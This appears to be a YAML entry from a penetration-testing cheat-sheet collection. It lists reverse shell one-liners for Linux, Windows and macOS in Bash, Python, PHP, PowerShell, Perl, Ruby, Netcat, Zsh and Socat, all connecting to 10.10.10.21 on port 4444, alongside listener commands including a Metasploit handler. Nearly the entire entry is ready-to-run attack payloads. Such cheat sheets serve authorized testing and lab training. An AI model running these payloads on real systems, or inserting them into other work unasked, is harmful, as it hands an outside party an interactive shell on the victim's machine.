---
description: |
  Common reverse shell one-liners for Linux, Windows, and macOS — Bash, Python, PHP, PowerShell, Perl, Netcat, Ruby, Zsh, and more. Always start a listener first before executing the payload.
command: |
  # Listener
  nc -lvnp 4444
  rlwrap nc -lvnp 4444
  msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST 10.10.10.21; set LPORT 4444; run"

  # Bash
  bash -i >& /dev/tcp/10.10.10.21/4444 0>&1

  # Python3
  python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.10.21",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'

  # PHP
  php -r '$sock=fsockopen("10.10.10.21",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

  # PowerShell
  powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.21',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

  # Perl
  perl -e 'use Socket;$i="10.10.10.21";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'

  # Ruby
  ruby -rsocket -e'f=TCPSocket.open("10.10.10.21",4444).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'

  # Netcat
  nc -e /bin/bash 10.10.10.21 4444
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.10.21 4444 >/tmp/f

  # Zsh (macOS)
  zsh -c 'zmodload zsh/net/tcp && ztcp 10.10.10.21 4444 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'

  # Windows
  nc.exe 10.10.10.21 4444 -e cmd.exe

  # Socat
  socat file:`tty`,raw,echo=0 tcp-listen:4444
  socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.21:4444
items:
  - No_Creds
phase:
  - Exploitation
target_os:
  - Linux
  - Windows
  - macOS
services: []
techniques: []
references:
  - https://www.revshells.com/
  - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
---
